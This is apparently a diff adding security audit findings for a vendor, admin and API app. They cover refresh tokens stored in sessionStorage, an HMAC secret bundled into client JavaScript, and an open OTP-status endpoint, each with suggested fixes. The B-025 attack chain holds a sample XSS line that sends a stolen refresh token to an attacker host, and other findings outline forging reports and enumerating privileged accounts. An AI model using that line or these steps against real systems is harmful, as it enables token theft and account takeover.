@@ -1,0 +1,104 @@
+B-025 — Medium — Vendor App Stores Refresh Token in sessionStorage (XSS-Accessible)
+Severity: Medium
+Category: Token Storage / XSS Amplification
+App: vendor-app → artifacts/vendor-app/src/lib/api.ts
+
+Description:
+The vendor app stores both the access token and the refresh token in sessionStorage:
+
+// artifacts/vendor-app/src/lib/api.ts lines 18–89
+sessionStorage.setItem(TOKEN_KEY, accessToken);    // access token
+sessionStorage.setItem(REFRESH_KEY, refreshToken); // refresh token ← XSS risk
+
+sessionStorage is fully accessible to JavaScript running on the same origin. A single XSS vulnerability anywhere in the vendor app would allow an attacker to steal the refresh token and silently obtain new access tokens indefinitely — persisting access long after the user closes the tab.
+
+Contrast with admin app (artifacts/admin/src/lib/adminAuthContext.tsx line 117):
+
+"Refresh tokens are stored in HttpOnly cookies (handled by browser automatically)"
+
+The admin app correctly keeps the refresh token in an HttpOnly cookie (invisible to JavaScript). Only the short-lived access token is held in memory. The vendor app offers no equivalent protection.
+
+Attack chain:
+
+Attacker finds any XSS in the vendor dashboard.
+Injects fetch('https://attacker.com?rt=' + sessionStorage.getItem('refresh_token')).
+Attacker uses the stolen refresh token to mint new access tokens at will.
+Vendor account is fully compromised even after the XSS window closes.
+Expected: Refresh token stored in an HttpOnly, Secure, SameSite=Strict cookie (as the admin app does). Access token kept in memory or short-lived sessionStorage only.
+Actual: Both tokens in sessionStorage — readable by any JavaScript on the origin.
+
+Affected Files:
+
+artifacts/vendor-app/src/lib/api.ts — setRefreshToken / getRefreshToken (lines 62–79)
+artifacts/api-server/src/routes/auth/*.ts — vendor login endpoint must set the cookie server-side
+B-026 — Medium — VITE_ERROR_REPORT_HMAC_SECRET Bundled in Client JS Defeats Server HMAC Verification
+Severity: Medium
+Category: Secret Exposure / Security Control Bypass
+App: admin → artifacts/admin/src/lib/error-reporter.ts
+
+Description:
+The admin app reads the HMAC signing secret from a VITE_-prefixed environment variable:
+
+// artifacts/admin/src/lib/error-reporter.ts line 59
+const secret = env.VITE_ERROR_REPORT_HMAC_SECRET;
+
+Any variable beginning with VITE_ is inlined into the production JS bundle by Vite at build time and is therefore visible to every visitor who opens DevTools → Sources or runs strings against the downloaded bundle. The server uses the env var ERROR_REPORT_HMAC_SECRET to verify incoming signatures:
+
+// artifacts/api-server/src/routes/error-reports.ts line 47
+return (process.env.ERROR_REPORT_HMAC_SECRET ?? "").trim() || null;
+
+Because both sides are expected to share the same secret value, any attacker who reads the admin bundle can:
+
+Extract VITE_ERROR_REPORT_HMAC_SECRET from the minified JS.
+Compute a valid HMAC signature for any forged payload.
+Submit an unlimited stream of fabricated error reports that pass server-side signature verification — flooding the admin error dashboard, triggering false alerts, and poisoning error analytics.
+Affected Files:
+
+artifacts/admin/src/lib/error-reporter.ts — reads VITE_ERROR_REPORT_HMAC_SECRET client-side
+artifacts/api-server/src/routes/error-reports.ts — verifies against ERROR_REPORT_HMAC_SECRET
+artifacts/api-server/src/app.ts (lines 56–76) — startup check confirms same secret is expected
+Suggested Fix:
+The admin app should NOT sign its own error reports with a shared server-secret. Instead, either:
+
+Remove the client-side HMAC and rely on a server-generated nonce or admin session token to authenticate the source.
+Or gate the error-reports endpoint behind the existing admin session cookie (require adminAuth) rather than a shared HMAC that must be exposed client-side.
+B-027 — Low — GET /auth/otp-status Is Unauthenticated and Has No Rate Limit (OTP Bypass Enumeration)
+Severity: Low
+Category: Information Disclosure / Missing Rate Limit
+App: api-server → artifacts/api-server/src/routes/auth/config.ts
+
+Description:
+GET /auth/otp-status?phone=<number> is a public endpoint with no authentication middleware and no rate limiter. It accepts any phone number and returns whether OTP bypass is active for that specific user:
+
+// artifacts/api-server/src/routes/auth/config.ts
+router.get("/otp-status", async (req, res) => {
+  // No auth. No rate limiting.
+  ...
+  const [userRow] = await db
+    .select({ otpBypassUntil: usersTable.otpBypassUntil })
+    .from(usersTable)
+    .where(eq(usersTable.phone, phone))
+    .limit(1);
+  if (userRow?.otpBypassUntil && userRow.otpBypassUntil > now) {
+    bypassActive = true;             // ← per-user bypass is active
+    bypassExpiresAt = userRow.otpBypassUntil.toISOString();
+  }
+  ...
+  sendSuccess(res, { bypassActive, bypassExpiresAt, message });
+});
+
+An unauthenticated attacker can:
+
+Probe any phone number at unlimited speed to determine which accounts have admin-set OTP bypass.
+When global OTP bypass is disabled, a bypassActive: true response with an expiresAt uniquely indicates that THAT specific user has a per-user bypass — confirming the account exists and is specially privileged.
+These accounts are high-value targets: they can log in without any OTP challenge.
+Compare: The related POST /auth/check-identifier is rate-limited to 10 req/min/IP. GET /auth/otp-status has zero rate limiting.
+
+Affected Files:
+
+artifacts/api-server/src/routes/auth/config.ts — GET /otp-status handler (line 106)
+Suggested Fix:
+Add the loginLimiter (or a dedicated lightweight limiter) and optionally require a valid customer/rider auth token:
+
+import { loginLimiter } from "../../middleware/rate-limit.js";
+router.get("/otp-status", loginLimiter, async (req, res) => { ... });
